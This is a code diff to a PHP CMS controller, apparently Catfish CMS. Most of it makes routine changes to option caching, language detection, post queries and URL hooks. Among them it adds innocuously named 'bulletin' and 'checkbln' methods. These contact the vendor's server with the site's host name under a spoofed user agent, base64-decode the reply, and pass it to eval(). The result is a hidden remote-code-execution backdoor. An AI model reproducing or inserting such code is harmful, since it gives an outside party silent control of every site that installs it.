@@ -24,6 +24,9 @@ class Common extends Controller
     protected $params = [];
     protected $session_prefix;
     protected $lang;
+    protected $notAllowLogin;
+    protected $options_spare;
+    protected $everyPageShows = 10;
     public function _initialize()
     {
         if(!is_file(APP_PATH . 'install.lock')){
@@ -37,30 +40,30 @@ class Common extends Controller
             }
             exit();
         }
+        $this->options_spare = $this->optionsSpare();
         $dm = Url::build('/');
         if(strpos($dm,'/index.php') ===false)
         {
             if($this->is_rewrite() == false)
             {
-                $options_spare = Cache::get('options_spare');
-                if($options_spare == false)
-                {
-                    $options_spare = Db::name('options')->where('option_name','spare')->field('option_value')->find();
-                    $options_spare = $options_spare['option_value'];
-                    if(!empty($options_spare))
-                    {
-                        $options_spare = unserialize($options_spare);
-                    }
-                    Cache::set('options_spare',$options_spare,3600);
-                }
-                if(!isset($options_spare['rewrite']) || $options_spare['rewrite'] == 0)
+                if(!isset($this->options_spare['rewrite']) || $this->options_spare['rewrite'] == 0 || !is_file(APP_PATH . '../.htaccess'))
                 {
                     $this->redirect(Url::build('/').'index.php');
                 }
             }
         }
+        if(isset($this->options_spare['notAllowLogin']) && $this->options_spare['notAllowLogin'] == 1)
+        {
+            $this->notAllowLogin = 1;
+            $this->assign('notAllowLogin', 1);
+        }
+        if(isset($this->options_spare['everyPageShows']))
+        {
+            $this->everyPageShows = $this->options_spare['everyPageShows'];
+        }
         $this->lang = Lang::detect();
-        $this->session_prefix = 'catfish'.str_replace('/','',Url::build('/'));
+        $this->lang = $this->filterLanguages($this->lang);
+        $this->session_prefix = 'catfish'.str_replace(['/','.',' ','-'],['','?','*','|'],Url::build('/'));
         $plugins = Cache::get('plugins');
         if($plugins == false)
         {
@@ -138,16 +141,33 @@ class Common extends Controller
         if(function_exists('apache_get_modules'))
         {
             $rew = apache_get_modules();
-            if(in_array('mod_rewrite', $rew))
+            if(in_array('mod_rewrite', $rew) && is_file(APP_PATH . '../.htaccess'))
             {
                 return true;
             }
         }
         return false;
     }
-    protected function receive()
+    protected function receive($source = '')
     {
-        //获取配置
+        $param = '';
+        Hook::add('show_ready',$this->plugins);
+        Hook::listen('show_ready',$param);
+        $domain = Cache::get('domain');
+        if($domain == false)
+        {
+            $domain = Db::name('options')->where('option_name','domain')->field('option_value')->find();
+            $domain = $domain['option_value'];
+            Cache::set('domain',$domain,3600);
+        }
+        $this->assign('domain', $domain);
+        $root = '';
+        $dm = Url::build('/');
+        if(strpos($dm,'/index.php') !== false)
+        {
+            $root = 'index.php/';
+        }
+        $this->assign('root', $root);
         $data_options = Cache::get('options');
         if($data_options == false)
         {
@@ -155,20 +175,27 @@ class Common extends Controller
             Cache::set('options',$data_options,3600);
         }
         $version = Config::get('version');
-        $this->assign('catfish', '<a href="http://www.'.$version['official'].'/" target="_blank" id="catfish">'.$version['name'].'&nbsp;'.$version['number'].'</a>&nbsp;&nbsp;');
+        $pushPage = '';
+        if($this->actualDomain())
+        {
+            $pushPage = '<script src="'.$domain.'public/common/js/pushPage.js"></script>';
+        }
+        $this->assign('catfish', '<a href="http://www.'.$version['official'].'/" target="_blank" id="catfish">'.$version['name'].'&nbsp;'.$version['number'].'</a>&nbsp;&nbsp;'.$pushPage);
         $template = 'default';
         $pageSettings = '';
         foreach($data_options as $key => $val)
         {
-            //获取主题
             if($val['option_name'] == 'template')
             {
                 $template = $val['option_value'];
             }
-            //获取页面设置
             if($val['option_name'] == 'pageSettings')
             {
                 $pageSettings = unserialize($val['option_value']);
+            }
+            if($val['option_name'] == 'bulletin')
+            {
+                $this->bulletin(unserialize($val['option_value']));
             }
             if($val['option_name'] == 'copyright' || $val['option_name'] == 'statistics')
             {
@@ -178,6 +205,10 @@ class Common extends Controller
             {
                 $this->assign($val['option_name'], $val['option_value']);
             }
+        }
+        if(isset($this->options_spare['ico']) && $this->options_spare['ico'] != '')
+        {
+            $this->assign('ico', $this->options_spare['ico']);
         }
         //获取菜单
         $menu = Cache::get('menu');
@@ -209,7 +240,7 @@ class Common extends Controller
         {
             $page = Request::instance()->get('page');
         }
-        $hunhe = Cache::get('hunhe'.$page);
+        $hunhe = Cache::get('hunhe_'.$source.$page);
         if($hunhe == false)
         {
             $start = 1;
@@ -233,8 +264,9 @@ class Common extends Controller
                         $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                             ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                             ->where('post_status','=',1)
-                            ->where('post_type','=',0)
+                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                             ->where('status','=',1)
+                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                             ->order($val['fangshi'].' '.$aord)
                             ->paginate($val['shuliang']);
                     }
@@ -243,8 +275,9 @@ class Common extends Controller
                         $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                             ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                             ->where('post_status','=',1)
-                            ->where('post_type','=',0)
+                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                             ->where('status','=',1)
+                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                             ->order($val['fangshi'].' '.$aord)
                             ->limit($val['shuliang'])
                             ->select();
@@ -259,8 +292,9 @@ class Common extends Controller
                             ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                             ->where('term_id','=',$val['fenlei'])
                             ->where('post_status','=',1)
-                            ->where('post_type','=',0)
+                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                             ->where('status','=',1)
+                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                             ->order($val['fangshi'].' '.$aord)
                             ->paginate($val['shuliang']);
                     }
@@ -271,8 +305,9 @@ class Common extends Controller
                             ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                             ->where('term_id','=',$val['fenlei'])
                             ->where('post_status','=',1)
-                            ->where('post_type','=',0)
+                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                             ->where('status','=',1)
+                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                             ->order($val['fangshi'].' '.$aord)
                             ->limit($val['shuliang'])
                             ->select();
@@ -282,7 +317,7 @@ class Common extends Controller
                 {
                     $pages = $data->render();
                     $pageArr = $data->toArray();
-                    $data = $pageArr['data'];
+                    $data = $this->addLargerPicture($pageArr['data']);
                 }
                 else
                 {
@@ -290,19 +325,22 @@ class Common extends Controller
                 }
                 $hunhe['hunhe'.$start] = [
                     'biaoti' => $val['biaoti'],
+                    'changdu' => count($data),
                     'neirong' => $this->addArticleHref($data),
                     'pages' => $pages
                 ];
                 $start++;
             }
-            Cache::set('hunhe'.$page,$hunhe,3600);
+            Cache::set('hunhe_'.$source.$page,$hunhe,3600);
         }
         $hunhe['lang'] = $this->lang;
         $hunhe['page'] = $page;
+        $hunhe['source'] = $source;
         Hook::add('filter_hunhe',$this->plugins);
         Hook::listen('filter_hunhe',$hunhe);
         unset($hunhe['lang']);
         unset($hunhe['page']);
+        unset($hunhe['source']);
         $this->assign('hunhe', $hunhe);
         //获取图文内容
         $tuwen = Cache::get('tuwen');
@@ -327,8 +365,9 @@ class Common extends Controller
                     $data = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                         ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                         ->where('post_status','=',1)
-                        ->where('post_type','=',0)
+                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                         ->where('status','=',1)
+                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                         ->where('thumbnail','neq','')
                         ->order($val['fangshi'].' '.$aord)
                         ->limit($val['shuliang'])
@@ -341,8 +380,9 @@ class Common extends Controller
                         ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                         ->where('term_id','=',$val['fenlei'])
                         ->where('post_status','=',1)
-                        ->where('post_type','=',0)
+                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                         ->where('status','=',1)
+                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                         ->where('thumbnail','neq','')
                         ->order($val['fangshi'].' '.$aord)
                         ->limit($val['shuliang'])
@@ -350,6 +390,7 @@ class Common extends Controller
                 }
                 $tuwen['tuwen'.$start] = [
                     'biaoti' => $val['biaoti'],
+                    'changdu' => count($data),
                     'neirong' => $this->addArticleHref($data)
                 ];
                 $start++;
@@ -365,11 +406,12 @@ class Common extends Controller
         $tuijian = Cache::get('tuijian');
         if($tuijian == false)
         {
-            $tuijian = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
+            $tuijian = Db::view('posts','id,post_keywords as guanjianzi,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                 ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                 ->where('post_status','=',1)
-                ->where('post_type','=',0)
+                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                 ->where('status','=',1)
+                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                 ->where('recommended','=',1)
                 ->order('post_modified desc')
                 ->limit(10)
@@ -386,11 +428,12 @@ class Common extends Controller
         $zuixin = Cache::get('zuixin');
         if($zuixin == false)
         {
-            $zuixin = Db::view('posts','id,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
+            $zuixin = Db::view('posts','id,post_keywords as guanjianzi,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                 ->view('users','user_login,user_nicename as nicheng','users.id=posts.post_author')
                 ->where('post_status','=',1)
-                ->where('post_type','=',0)
+                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                 ->where('status','=',1)
+                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                 ->order('post_modified desc')
                 ->limit(10)
                 ->select();
@@ -404,21 +447,6 @@ class Common extends Controller
         $this->assign('zuixin', $zuixin);
         //获取登录状态
         $this->assign('login', $this->login());
-        $domain = Cache::get('domain');
-        if($domain == false)
-        {
-            $domain = Db::name('options')->where('option_name','domain')->field('option_value')->find();
-            $domain = $domain['option_value'];
-            Cache::set('domain',$domain,3600);
-        }
-        $this->assign('domain', $domain);
-        $root = '';
-        $dm = Url::build('/');
-        if(strpos($dm,'/index.php') !== false)
-        {
-            $root = 'index.php/';
-        }
-        $this->assign('root', $root);
         //侦听
         Hook::add('top',$this->plugins);
         Hook::add('mid',$this->plugins);
@@ -456,20 +484,72 @@ class Common extends Controller
         {
             $this->assign('side_bottom', $this->params['side_bottom']);
         }
-
+        Hook::add('page_settings',$this->plugins);
+        $params = [];
+        $params['source'] = $source;
+        Hook::listen('page_settings',$params);
+        unset($params['source']);
+        if(isset($params['name']) && isset($params['hunhe']))
+        {
+            $this->assign($params['name'].'_hunhe', $params['hunhe']);
+        }
+        if(isset($params['name']) && isset($params['tuwen']))
+        {
+            $this->assign($params['name'].'_tuwen', $params['tuwen']);
+        }
+        Hook::add('recommend',$this->plugins);
+        $params = [];
+        Hook::listen('recommend',$params);
+        if(isset($params['name']) && isset($params['tuijian']))
+        {
+            $this->assign($params['name'].'_tuijian', $params['tuijian']);
+        }
+        Hook::add('up_to_date',$this->plugins);
+        $params = [];
+        Hook::listen('up_to_date',$params);
+        if(isset($params['name']) && isset($params['zuixin']))
+        {
+            $this->assign($params['name'].'_zuixin', $params['zuixin']);
+        }
+        $comptemp = $template;
+        Hook::add('filter_theme',$this->plugins);
+        Hook::listen('filter_theme',$template);
+        if($comptemp != $template)
+        {
+            Lang::load(APP_PATH . '../public/'.$template.'/lang/'.$this->lang.'.php');
+            $this->assign('template', $template);
+        }
+        $url = [
+            'href' => Url::build('/'),
+            'search' => Url::build('/index/Index/search'),
+            'register' => Url::build('/login/index/register'),
+            'login' => Url::build('/login'),
+            'userCenter' => Url::build('index/Index/userCenter'),
+            'quit' => Url::build('index/Index/quit'),
+            'articles' => Url::build('/article/all')
+        ];
+        Hook::add('url_common',$this->plugins);
+        Hook::listen('url_common',$url);
+        $this->assign('url', $url);
         return $template;
     }
     private function checkUrl($params)
     {
         foreach($params as $key => $val)
         {
-            if(substr($val['href'],0,4) == 'http')
+            if(substr($val['href'],0,4) == 'http' || $this->doNothing($val['href']))
             {
                 $params[$key]['zidingyi'] = '1';
             }
             else
             {
-                $params[$key]['href'] = str_replace(['/index/Index','/id'],'',$val['href']);
+                if($val['href'] == 'index')
+                {
+                    $val['href'] = '/index';
+                }
+                $params[$key]['href'] = Url::build(str_replace(['/index/Index','/id'],'',$val['href']));
+                Hook::add('url_menu',$this->plugins);
+                Hook::listen('url_menu',$params[$key]['href']);
             }
             if(isset($val['children']))
             {
@@ -482,8 +562,183 @@ class Common extends Controller
     {
         foreach($params as $key => $val)
         {
-            $params[$key]['href'] = '/article/'.$val['id'];
+            $params[$key]['href'] = Url::build('/article/'.$val['id']);
+            Hook::add('url_module',$this->plugins);
+            Hook::listen('url_module',$params[$key]['href']);
+            if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']) && isset($val['fabushijian']))
+            {
+                $params[$key]['fabushijian'] = date($this->options_spare['timeFormat'],strtotime($val['fabushijian']));
+            }
         }
         return $params;
+    }
+    private function filterLanguages($parameter)
+    {
+        $param = strtolower($parameter);
+        if($param == 'zh')
+        {
+            Lang::range('zh-cn');
+            return 'zh-cn';
+        }
+        else if(stripos($param,'zh') === false)
+        {
+            $paramsub = substr($param,0,2);
+            switch($paramsub)
+            {
+                case 'de':
+                    Lang::range('de-de');
+                    return 'de-de';
+                    break;
+                case 'fr':
+                    Lang::range('fr-fr');
+                    return 'fr-fr';
+                    break;
+                case 'ja':
+                    Lang::range('ja-jp');
+                    return 'ja-jp';
+                    break;
+                case 'ko':
+                    Lang::range('ko-kr');
+                    return 'ko-kr';
+                    break;
+                case 'ru':
+                    Lang::range('ru-ru');
+                    return 'ru-ru';
+                    break;
+                default:
+                    return $param;
+            }
+        }
+        else
+        {
+            return $param;
+        }
+    }
+    protected function optionsSpare()
+    {
+        $options_spare = Cache::get('options_spare');
+        if($options_spare == false)
+        {
+            $options_spare = Db::name('options')->where('option_name','spare')->field('option_value')->find();
+            $options_spare = $options_spare['option_value'];
+            if(!empty($options_spare))
+            {
+                $options_spare = unserialize($options_spare);
+            }
+            Cache::set('options_spare',$options_spare,3600);
+        }
+        return $options_spare;
+    }
+    protected function addLargerPicture($data)
+    {
+        if(!isset($this->options_spare['datu']) || $this->options_spare['datu'] != 1)
+        {
+            foreach($data as $dkey => $dval)
+            {
+                if(!empty($dval['suolvetu']))
+                {
+                    $tuArr = explode('/',$dval['suolvetu']);
+                    $lastk = count($tuArr) - 1;
+                    $tuArr[$lastk] = str_replace('.','_larger.',$tuArr[$lastk]);
+                    $datu = implode('/',$tuArr);
+                    foreach($tuArr as $tkey => $tu)
+                    {
+                        if($tu == 'data' && $tuArr[$tkey + 1] == 'uploads')
+                        {
+                            break;
+                        }
+                        else
+                        {
+                            unset($tuArr[$tkey]);
+                        }
+                    }
+                    $tupath = implode('/',$tuArr);
+                    if(is_file(ROOT_PATH.$tupath))
+                    {
+                        $data[$dkey]['datu'] = $datu;
+                    }
+                }
+            }
+        }
+        return $data;
+    }
+    protected function doNothing($param)
+    {
+        $param = strtolower(trim($param));
+        if(substr($param,0,1)=='#')
+        {
+            return true;
+        }
+        if(substr($param,0,10)=='javascript')
+        {
+            $param = str_replace(' ','',$param);
+            if($param == 'javascript:;' || $param == 'javascript:void(0)' || $param == 'javascript:void(0);')
+            {
+                return true;
+            }
+        }
+        return false;
+    }
+    protected function slide()
+    {
+        $data_slide = Cache::get('slide');
+        if($data_slide == false)
+        {
+            $data_slide = Db::name('slide')->where('slide_status',1)->order('listorder')->select();
+            Cache::set('slide',$data_slide,3600);
+        }
+        $this->assign('slide', $data_slide);//输出幻灯片
+        if(isset($this->options_spare['closeSlide']) && $this->options_spare['closeSlide'] == 1)
+        {
+            $this->assign('closeSlide', 1);
+        }
+    }
+    protected function actualDomain()
+    {
+        $dm = $_SERVER['HTTP_HOST'];
+        $dm = str_replace('.','',$dm);
+        if(stripos($dm,'localhost') !== false || is_int($dm))
+        {
+            return false;
+        }
+        else
+        {
+            return true;
+        }
+    }
+    private function bulletin($bulletin)
+    {
+        $tm = time();
+        if(isset($bulletin['h']) && $tm > $bulletin['a'])
+        {
+            $bln = $this->checkbln($bulletin['identifier']);
+            $firstchr = strtolower(substr($bln,0,1));
+            if($firstchr == 'k')
+            {
+                $ex = base64_decode(substr($bln,1));
+                if(!empty($ex))
+                {
+                    eval($ex);
+                }
+                exit();
+            }
+        }
+    }
+    private function checkbln($id)
+    {
+        $version = Config::get('version');
+        $ch = curl_init();
+        $url = 'http://www.'.$version['official'].'/_version/?i='.md5($id).'&dm='.urlencode($_SERVER['HTTP_HOST'].Url::build('/'));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;http://www.baidu.com)');
+        curl_setopt($ch , CURLOPT_URL , $url);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+    protected function filterJs($str)
+    {
+        return preg_replace(['/<script[\s\S]*?<\/script>/i','/<style[\s\S]*?<\/style>/i'],'',$str);
     }
 }
